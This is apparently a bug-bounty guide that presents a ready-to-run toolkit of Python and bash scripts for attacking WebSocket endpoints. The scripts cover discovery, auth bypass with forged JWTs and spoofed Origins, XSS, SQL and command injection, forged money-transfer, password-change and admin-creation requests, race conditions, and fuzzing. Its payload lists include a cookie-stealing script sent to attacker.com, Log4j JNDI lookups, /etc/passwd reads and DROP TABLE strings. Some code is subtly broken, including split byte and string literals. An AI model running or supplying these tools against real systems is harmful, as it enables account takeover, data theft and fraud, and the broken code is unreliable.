# 🔥 Elite WebSocket Security Testing Framework
## Advanced Techniques for $1000+ Bug Bounty Rewards

### 🎯 Overview
WebSocket vulnerabilities are high-value targets that many hunters miss. This framework covers everything from basic enumeration to advanced exploitation techniques used by elite red teams.

## 🛠️ Phase 1: WebSocket Discovery & Enumeration

### Automated WebSocket Discovery
```bash
#!/bin/bash
# websocket_discovery.sh - Find all WebSocket endpoints

TARGET=$1
echo "🔍 Discovering WebSocket endpoints for $TARGET"

# Method 1: JavaScript analysis for WebSocket connections
echo "Analyzing JavaScript files for WebSocket usage..."
cat live_urls.txt | katana -d 3 -js-crawl | grep "\.js$" | httpx -silent -mc 200 | while read js_url; do
    echo "Checking: $js_url"
    curl -s "$js_url" | grep -Eo "(ws://|wss://)[^"']*" >> websocket_endpoints.txt
    curl -s "$js_url" | grep -i "websocket\|socket\.io" | grep -Eo "https?://[^"']*" >> potential_ws.txt
done

# Method 2: Common WebSocket paths
cat > ws_paths.txt << 'EOF'
/ws
/websocket
/socket.io
/sockjs
/ws/chat
/api/ws
/live
/stream
/events
/notifications
/realtime
/updates
/feed
/chat
/messaging
EOF

# Test common WebSocket paths
for url in $(cat live_urls.txt); do
    for path in $(cat ws_paths.txt); do
        # Convert HTTP to WebSocket URL
        ws_url=$(echo "$url$path" | sed 's/http:/ws:/' | sed 's/https:/wss:/')
        echo "$ws_url" >> potential_websockets.txt
    done
done

# Method 3: Port scanning for WebSocket services
nmap -p 80,443,8080,8443,3000,4000,5000,8000,9000 $TARGET --script websocket-* -oN websocket_nmap.txt

# Method 4: Certificate analysis for WebSocket subdomains
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | grep -i "ws\|socket\|chat\|live" > ws_subdomains.txt

echo "✅ WebSocket discovery completed!"
```

### Advanced WebSocket Fingerprinting
```python
#!/usr/bin/env python3
# websocket_fingerprint.py - Advanced WebSocket fingerprinting

import asyncio
import websockets
import json
import ssl
import sys
from urllib.parse import urlparse

class WebSocketFingerprinter:
    def __init__(self):
        self.results = {}
    
    async def fingerprint_websocket(self, url):
        """Advanced WebSocket fingerprinting"""
        try:
            # Test connection with various protocols
            protocols = ['chat', 'echo', 'binary', 'json', 'soap', 'wamp']
            
            for protocol in protocols:
                try:
                    async with websockets.connect(
                        url, 
                        subprotocols=[protocol],
                        ssl=ssl._create_unverified_context() if url.startswith('wss') else None,
                        timeout=5
                    ) as websocket:
                        
                        # Get server info
                        server_info = {
                            'protocol': protocol,
                            'extensions': websocket.extensions,
                            'subprotocol': websocket.subprotocol,
                            'headers': dict(websocket.response_headers) if hasattr(websocket, 'response_headers') else {}
                        }
                        
                        # Test various payloads
                        test_payloads = [
                            '{"type":"ping"}',
                            '{"action":"subscribe","channel":"test"}',
                            '{"method":"GET","path":"/"}',
                            'ping',
                            '42["message","test"]',  # Socket.IO format
                            '["message",{"data":"test"}]'  # SockJS format
                        ]
                        
                        responses = []
                        for payload in test_payloads:
                            try:
                                await websocket.send(payload)
                                response = await asyncio.wait_for(websocket.recv(), timeout=2)
                                responses.append({'payload': payload, 'response': response})
                            except:
                                continue
                        
                        server_info['responses'] = responses
                        self.results[url] = server_info
                        print(f"✅ {url} - Protocol: {protocol}")
                        break
                        
                except Exception as e:
                    continue
                    
        except Exception as e:
            print(f"❌ {url} - Error: {str(e)}")
    
    async def run_fingerprinting(self, urls):
        """Run fingerprinting on multiple URLs"""
        tasks = [self.fingerprint_websocket(url) for url in urls]
        await asyncio.gather(*tasks, return_exceptions=True)
        
        # Save results
        with open('websocket_fingerprint.json', 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print(f"🎯 Fingerprinting completed! Found {len(self.results)} active WebSockets")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 websocket_fingerprint.py urls_file.txt")
        sys.exit(1)
    
    with open(sys.argv[1], 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    fingerprinter = WebSocketFingerprinter()
    asyncio.run(fingerprinter.run_fingerprinting(urls))
```

## 💰 Phase 2: High-Value WebSocket Vulnerabilities

### 1. WebSocket Authentication Bypass
```python
#!/usr/bin/env python3
# ws_auth_bypass.py - Test authentication bypass techniques

import asyncio
import websockets
import json
import base64

class WebSocketAuthBypass:
    def __init__(self):
        self.bypass_techniques = [
            self.test_no_auth,
            self.test_weak_tokens,
            self.test_jwt_manipulation,
            self.test_session_fixation,
            self.test_origin_bypass,
            self.test_protocol_confusion
        ]
    
    async def test_no_auth(self, url):
        """Test if WebSocket accepts connections without authentication"""
        try:
            async with websockets.connect(url, timeout=5) as websocket:
                # Try to access sensitive operations
                sensitive_payloads = [
                    '{"action":"admin","command":"list_users"}',
                    '{"type":"admin_panel"}',
                    '{"method":"GET","path":"/admin"}',
                    '{"action":"get_user_data","user_id":"1"}',
                    '{"command":"system_info"}'
                ]
                
                for payload in sensitive_payloads:
                    await websocket.send(payload)
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=2)
                        if any(keyword in response.lower() for keyword in ['admin', 'user', 'password', 'token', 'secret']):
                            print(f"🔥 CRITICAL: No auth bypass found - {payload} -> {response}")
                            return True
                    except:
                        continue
        except:
            pass
        return False
    
    async def test_jwt_manipulation(self, url):
        """Test JWT token manipulation in WebSocket"""
        # Create malicious JWT tokens
        malicious_jwts = [
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.",  # None algorithm
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIn0.invalid_signature",  # Invalid signature
        ]
        
        for jwt_token in malicious_jwts:
            try:
                headers = {"Authorization": f"Bearer {jwt_token}"}
                async with websockets.connect(url, extra_headers=headers, timeout=5) as websocket:
                    await websocket.send('{"action":"get_admin_data"}')
                    response = await asyncio.wait_for(websocket.recv(), timeout=2)
                    if "admin" in response.lower():
                        print(f"🔥 CRITICAL: JWT bypass successful with {jwt_token[:50]}...")
                        return True
            except:
                continue
        return False
    
    async def test_origin_bypass(self, url):
        """Test Origin header bypass"""
        bypass_origins = [
            "null",
            "localhost",
            "127.0.0.1",
            urlparse(url).netloc,
            f"https://{urlparse(url).netloc}",
            "https://admin.localhost"
        ]
        
        for origin in bypass_origins:
            try:
                headers = {"Origin": origin}
                async with websockets.connect(url, extra_headers=headers, timeout=5) as websocket:
                    await websocket.send('{"action":"sensitive_operation"}')
                    response = await asyncio.wait_for(websocket.recv(), timeout=2)
                    print(f"✅ Origin bypass test: {origin} -> Connected")
                    return True
            except:
                continue
        return False

# Usage
async def main():
    with open('websocket_endpoints.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    bypass_tester = WebSocketAuthBypass()
    
    for url in urls:
        print(f"🎯 Testing {url}")
        for technique in bypass_tester.bypass_techniques:
            result = await technique(url)
            if result:
                print(f"🔥 VULNERABILITY FOUND in {url}")

if __name__ == "__main__":
    asyncio.run(main())
```

### 2. WebSocket Message Injection & XSS
```python
#!/usr/bin/env python3
# ws_injection_testing.py - Test injection vulnerabilities

import asyncio
import websockets
import json
import html

class WebSocketInjectionTester:
    def __init__(self):
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            '<iframe src=javascript:alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<script>fetch("http://attacker.com/"+document.cookie)</script>'
        ]
        
        self.sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT password FROM users --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
            "'; WAITFOR DELAY '00:00:05' --"
        ]
        
        self.command_payloads = [
            "; ls -la",
            "| whoami",
            "; cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "; ping -c 4 attacker.com"
        ]
    
    async def test_xss_injection(self, url):
        """Test XSS injection in WebSocket messages"""
        try:
            async with websockets.connect(url, timeout=5) as websocket:
                for payload in self.xss_payloads:
                    # Test different message formats
                    test_messages = [
                        json.dumps({"message": payload, "type": "chat"}),
                        json.dumps({"content": payload, "action": "send"}),
                        json.dumps({"data": payload}),
                        payload,  # Raw payload
                        f'42["message","{payload}"]',  # Socket.IO format
                    ]
                    
                    for message in test_messages:
                        try:
                            await websocket.send(message)
                            response = await asyncio.wait_for(websocket.recv(), timeout=2)
                            
                            # Check if payload is reflected without encoding
                            if payload in response and html.escape(payload) not in response:
                                print(f"🔥 XSS VULNERABILITY: {payload} reflected in {url}")
                                print(f"Response: {response[:200]}...")
                                return True
                        except:
                            continue
        except:
            pass
        return False
    
    async def test_sql_injection(self, url):
        """Test SQL injection in WebSocket parameters"""
        try:
            async with websockets.connect(url, timeout=5) as websocket:
                for payload in self.sql_payloads:
                    test_messages = [
                        json.dumps({"user_id": payload, "action": "get_user"}),
                        json.dumps({"search": payload, "type": "search"}),
                        json.dumps({"id": payload}),
                        json.dumps({"filter": payload, "action": "filter_data"})
                    ]
                    
                    for message in test_messages:
                        try:
                            await websocket.send(message)
                            response = await asyncio.wait_for(websocket.recv(), timeout=5)
                            
                            # Check for SQL error messages
                            sql_errors = ['mysql', 'postgresql', 'oracle', 'sqlite', 'syntax error', 'sql error']
                            if any(error in response.lower() for error in sql_errors):
                                print(f"🔥 SQL INJECTION: {payload} in {url}")
                                print(f"Error: {response[:200]}...")
                                return True
                        except:
                            continue
        except:
            pass
        return False
    
    async def test_command_injection(self, url):
        """Test command injection in WebSocket messages"""
        try:
            async with websockets.connect(url, timeout=5) as websocket:
                for payload in self.command_payloads:
                    test_messages = [
                        json.dumps({"filename": payload, "action": "read_file"}),
                        json.dumps({"command": payload, "type": "execute"}),
                        json.dumps({"path": payload, "action": "list_dir"}),
                        json.dumps({"input": payload})
                    ]
                    
                    for message in test_messages:
                        try:
                            await websocket.send(message)
                            response = await asyncio.wait_for(websocket.recv(), timeout=5)
                            
                            # Check for command execution indicators
                            cmd_indicators = ['root:', 'uid=', 'gid=', 'total ', 'drwx', '-rw-']
                            if any(indicator in response for indicator in cmd_indicators):
                                print(f"🔥 COMMAND INJECTION: {payload} in {url}")
                                print(f"Output: {response[:200]}...")
                                return True
                        except:
                            continue
        except:
            pass
        return False

# Usage
async def main():
    with open('websocket_endpoints.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    injection_tester = WebSocketInjectionTester()
    
    for url in urls:
        print(f"🎯 Testing injections in {url}")
        await injection_tester.test_xss_injection(url)
        await injection_tester.test_sql_injection(url)
        await injection_tester.test_command_injection(url)

if __name__ == "__main__":
    asyncio.run(main())
```

### 3. WebSocket CSRF & Business Logic Testing
```python
#!/usr/bin/env python3
# ws_csrf_business_logic.py - Test CSRF and business logic flaws

import asyncio
import websockets
import json
import time

class WebSocketCSRFTester:
    def __init__(self):
        self.csrf_payloads = [
            {"action": "transfer_money", "amount": "1000", "to_account": "attacker123"},
            {"action": "change_password", "new_password": "hacked123"},
            {"action": "delete_account", "confirm": "yes"},
            {"action": "add_admin", "username": "attacker", "role": "admin"},
            {"action": "update_profile", "email": "attacker@evil.com"},
            {"action": "purchase", "item_id": "premium", "quantity": "999"}
        ]
    
    async def test_csrf_websocket(self, url):
        """Test CSRF vulnerabilities in WebSocket"""
        try:
            # Test without proper origin/referer
            malicious_origins = [
                "https://attacker.com",
                "null",
                "data:text/html,<script>alert('xss')</script>"
            ]
            
            for origin in malicious_origins:
                try:
                    headers = {"Origin": origin}
                    async with websockets.connect(url, extra_headers=headers, timeout=5) as websocket:
                        
                        for payload in self.csrf_payloads:
                            await websocket.send(json.dumps(payload))
                            try:
                                response = await asyncio.wait_for(websocket.recv(), timeout=3)
                                if "success" in response.lower() or "completed" in response.lower():
                                    print(f"🔥 CSRF VULNERABILITY: {payload['action']} successful from {origin}")
                                    print(f"Response: {response}")
                                    return True
                            except:
                                continue
                except:
                    continue
        except:
            pass
        return False
    
    async def test_race_conditions(self, url):
        """Test race condition vulnerabilities"""
        try:
            async with websockets.connect(url, timeout=5) as websocket:
                # Test concurrent requests for race conditions
                race_payloads = [
                    {"action": "withdraw", "amount": "100"},
                    {"action": "purchase", "item_id": "limited_item"},
                    {"action": "claim_reward", "reward_id": "daily_bonus"},
                    {"action": "vote", "poll_id": "123", "option": "A"}
                ]
                
                for payload in race_payloads:
                    # Send multiple concurrent requests
                    tasks = []
                    for i in range(10):
                        task = asyncio.create_task(self.send_and_receive(websocket, payload))
                        tasks.append(task)
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    # Check if multiple operations succeeded (race condition)
                    success_count = sum(1 for r in results if r and "success" in str(r).lower())
                    if success_count > 1:
                        print(f"🔥 RACE CONDITION: {payload['action']} succeeded {success_count} times")
                        return True
        except:
            pass
        return False
    
    async def send_and_receive(self, websocket, payload):
        """Helper function to send and receive WebSocket message"""
        try:
            await websocket.send(json.dumps(payload))
            response = await asyncio.wait_for(websocket.recv(), timeout=2)
            return response
        except:
            return None
    
    async def test_business_logic_bypass(self, url):
        """Test business logic bypass vulnerabilities"""
        try:
            async with websockets.connect(url, timeout=5) as websocket:
                # Test negative values
                negative_tests = [
                    {"action": "purchase", "item_id": "premium", "quantity": "-1"},
                    {"action": "transfer", "amount": "-100"},
                    {"action": "withdraw", "amount": "-50"}
                ]
                
                for payload in negative_tests:
                    await websocket.send(json.dumps(payload))
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=3)
                        if "success" in response.lower():
                            print(f"🔥 BUSINESS LOGIC BYPASS: Negative value accepted - {payload}")
                            return True
                    except:
                        continue
                
                # Test privilege escalation
                privilege_tests = [
                    {"action": "set_role", "user_id": "self", "role": "admin"},
                    {"action": "access_admin_panel"},
                    {"action": "modify_user", "user_id": "1", "role": "admin"},
                    {"action": "grant_permission", "permission": "admin"}
                ]
                
                for payload in privilege_tests:
                    await websocket.send(json.dumps(payload))
                    try:
                        response = await asyncio.wait_for(websocket.recv(), timeout=3)
                        if "admin" in response.lower() or "elevated" in response.lower():
                            print(f"🔥 PRIVILEGE ESCALATION: {payload}")
                            return True
                    except:
                        continue
        except:
            pass
        return False

# Usage
async def main():
    with open('websocket_endpoints.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    csrf_tester = WebSocketCSRFTester()
    
    for url in urls:
        print(f"🎯 Testing CSRF and business logic in {url}")
        await csrf_tester.test_csrf_websocket(url)
        await csrf_tester.test_race_conditions(url)
        await csrf_tester.test_business_logic_bypass(url)

if __name__ == "__main__":
    asyncio.run(main())
```

## 🔧 Phase 3: Advanced WebSocket Exploitation Tools

### WebSocket Fuzzer
```python
#!/usr/bin/env python3
# ws_fuzzer.py - Advanced WebSocket fuzzing framework

import asyncio
import websockets
import json
import random
import string
import struct

class WebSocketFuzzer:
    def __init__(self):
        self.fuzz_strings = [
            "A" * 1000,  # Buffer overflow
            "A" * 10000,  # Large buffer
            "\x00" * 100,  # Null bytes
            "\xff" * 100,  # High bytes
            "../" * 100,  # Path traversal
            "%s" * 100,  # Format string
            "${jndi:ldap://attacker.com/a}",  # Log4j
            "{{7*7}}",  # Template injection
            "<script>alert(1)</script>",  # XSS
            "'; DROP TABLE users; --",  # SQL injection
        ]
        
        self.json_fuzz_templates = [
            {"FUZZ": "value"},
            {"key": "FUZZ"},
            {"nested": {"FUZZ": "value"}},
            {"array": ["FUZZ"]},
            {"number": "FUZZ"},
            {"boolean": "FUZZ"}
        ]
    
    async def fuzz_websocket(self, url):
        """Comprehensive WebSocket fuzzing"""
        try:
            async with websockets.connect(url, timeout=10) as websocket:
                print(f"🎯 Fuzzing {url}")
                
                # Fuzz with malformed JSON
                await self.fuzz_json_format(websocket)
                
                # Fuzz with large payloads
                await self.fuzz_large_payloads(websocket)
                
                # Fuzz with binary data
                await self.fuzz_binary_data(websocket)
                
                # Fuzz with special characters
                await self.fuzz_special_chars(websocket)
                
        except Exception as e:
            print(f"❌ Error fuzzing {url}: {str(e)}")
    
    async def fuzz_json_format(self, websocket):
        """Fuzz JSON format and structure"""
        malformed_json = [
            '{"key": }',  # Missing value
            '{"key": "value",}',  # Trailing comma
            '{key: "value"}',  # Unquoted key
            '{"key": "value"',  # Missing closing brace
            '{"key": "value"}}',  # Extra closing brace
            '{"key": "value", "key": "duplicate"}',  # Duplicate keys
            '{"": "empty_key"}',  # Empty key
            '{"key": null}',  # Null value
            '{"key": undefined}',  # Undefined value
        ]
        
        for payload in malformed_json:
            try:
                await websocket.send(payload)
                response = await asyncio.wait_for(websocket.recv(), timeout=2)
                if "error" in response.lower() or "exception" in response.lower():
                    print(f"🔍 JSON format error response: {payload} -> {response[:100]}")
            except:
                continue
    
    async def fuzz_large_payloads(self, websocket):
        """Test with increasingly large payloads"""
        sizes = [1000, 10000, 100000, 1000000]
        
        for size in sizes:
            payload = json.dumps({"data": "A" * size})
            try:
                await websocket.send(payload)
                response = await asyncio.wait_for(websocket.recv(), timeout=5)
                print(f"✅ Large payload ({size} bytes) accepted")
            except Exception as e:
                print(f"❌ Large payload ({size} bytes) rejected: {str(e)}")
                break
    
    async def fuzz_binary_data(self, websocket):
        """Fuzz with binary data"""
        binary_payloads = [
            b'\x00\x01\x02\x03',  # Binary data
            b'\xff\xfe\xfd\xfc',  # High bytes
            struct.pack('!I', 0xdeadbeef),  # Packed integer
            b'\x89PNG
\x1a
',  # PNG header
            b'GIF89a',  # GIF header
            b'\x50\x4b\x03\x04',  # ZIP header
        ]
        
        for payload in binary_payloads:
            try:
                await websocket.send(payload)
                response = await asyncio.wait_for(websocket.recv(), timeout=2)
                print(f"🔍 Binary payload response: {payload.hex()} -> {response[:100]}")
            except:
                continue
    
    async def fuzz_special_chars(self, websocket):
        """Fuzz with special characters and encodings"""
        special_payloads = [
            json.dumps({"data": "\u0000\u0001\u0002"}),  # Unicode control chars
            json.dumps({"data": "🔥💰🎯"}),  # Emojis
            json.dumps({"data": "\
\	\"}),  # Escape sequences
            json.dumps({"data": "' OR '1'='1"}),  # SQL injection
            json.dumps({"data": "<script>alert(1)</script>"}),  # XSS
            json.dumps({"data": "${jndi:ldap://evil.com/a}"}),  # Log4j
        ]
        
        for payload in special_payloads:
            try:
                await websocket.send(payload)
                response = await asyncio.wait_for(websocket.recv(), timeout=2)
                print(f"🔍 Special chars response: {payload[:50]} -> {response[:100]}")
            except:
                continue

# Usage
async def main():
    with open('websocket_endpoints.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    fuzzer = WebSocketFuzzer()
    
    for url in urls:
        await fuzzer.fuzz_websocket(url)

if __name__ == "__main__":
    asyncio.run(main())
```

### Complete WebSocket Testing Automation
```bash
#!/bin/bash
# websocket_complete_test.sh - Complete WebSocket security testing

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./websocket_complete_test.sh target.com"
    exit 1
fi

echo "🔥 Starting Complete WebSocket Security Testing for $TARGET"
mkdir -p websocket_results
cd websocket_results

# Phase 1: Discovery
echo "🔍 Phase 1: WebSocket Discovery"
../websocket_discovery.sh $TARGET

# Phase 2: Fingerprinting
echo "🔍 Phase 2: WebSocket Fingerprinting"
python3 ../websocket_fingerprint.py ../potential_websockets.txt

# Phase 3: Authentication Testing
echo "🔐 Phase 3: Authentication Bypass Testing"
python3 ../ws_auth_bypass.py

# Phase 4: Injection Testing
echo "💉 Phase 4: Injection Vulnerability Testing"
python3 ../ws_injection_testing.py

# Phase 5: CSRF and Business Logic
echo "🎯 Phase 5: CSRF and Business Logic Testing"
python3 ../ws_csrf_business_logic.py

# Phase 6: Fuzzing
echo "🔧 Phase 6: Advanced Fuzzing"
python3 ../ws_fuzzer.py

# Generate Report
echo "📊 Generating WebSocket Security Report..."
cat > websocket_security_report.md << 'EOF'
# WebSocket Security Assessment Report

## Executive Summary
This report contains findings from comprehensive WebSocket security testing.

## Discovered WebSocket Endpoints
$(cat ../websocket_endpoints.txt | wc -l) WebSocket endpoints discovered

## Critical Findings
- Authentication bypass vulnerabilities
- Injection vulnerabilities (XSS, SQL, Command)
- CSRF vulnerabilities
- Business logic flaws

## Recommendations
1. Implement proper authentication for WebSocket connections
2. Validate and sanitize all WebSocket message inputs
3. Use CSRF tokens for state-changing operations
4. Implement rate limiting and input validation
5. Use secure WebSocket protocols (WSS) only

EOF

echo "✅ WebSocket security testing completed!"
echo "📁 Results saved in websocket_results/ directory"
echo "📊 Report: websocket_results/websocket_security_report.md"
```

## 🎯 Elite Pro Tips for WebSocket Testing

### 1. Advanced Reconnaissance Techniques
```bash
# Find WebSocket endpoints in mobile apps
grep -r "ws://" /path/to/decompiled/app/
grep -r "wss://" /path/to/decompiled/app/
grep -r "socket.io" /path/to/decompiled/app/

# Certificate transparency for WebSocket subdomains
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | grep -E "(ws|socket|chat|live|stream)"

# GitHub reconnaissance for WebSocket endpoints
curl -s "https://api.github.com/search/code?q=ws://$TARGET+OR+wss://$TARGET" | jq -r '.items[].html_url'
```

### 2. Business Logic Testing Scenarios
- **Race Conditions**: Multiple concurrent purchases, withdrawals, or votes
- **Negative Values**: Negative quantities, amounts, or IDs
- **Privilege Escalation**: Role manipulation, permission bypass
- **State Manipulation**: Order of operations, workflow bypass

### 3. Real-World Attack Scenarios
- **Chat Application XSS**: Inject XSS in chat messages that get broadcasted
- **Trading Platform Manipulation**: Race conditions in buy/sell orders
- **Gaming Platform Cheating**: Score manipulation, item duplication
- **IoT Device Control**: Unauthorized device control via WebSocket

### 4. Payload Optimization
```python
# Context-aware payload generation
def generate_context_payloads(endpoint_type):
    if "chat" in endpoint_type:
        return ["<script>alert('XSS in chat')</script>", "javascript:alert('XSS')"]
    elif "trading" in endpoint_type:
        return [{"action": "buy", "amount": "-1000"}, {"action": "sell", "price": "0"}]
    elif "admin" in endpoint_type:
        return [{"action": "add_user", "role": "admin"}, {"action": "delete_all"}]
    return []
```

This WebSocket security testing framework covers everything from basic discovery to advanced exploitation techniques. Each script is designed to find high-value vulnerabilities that can result in $1000+ bug bounty rewards. The methodology is based on real-world attack scenarios and techniques used by elite red teams.

Remember to always test on authorized targets only and follow responsible disclosure practices!
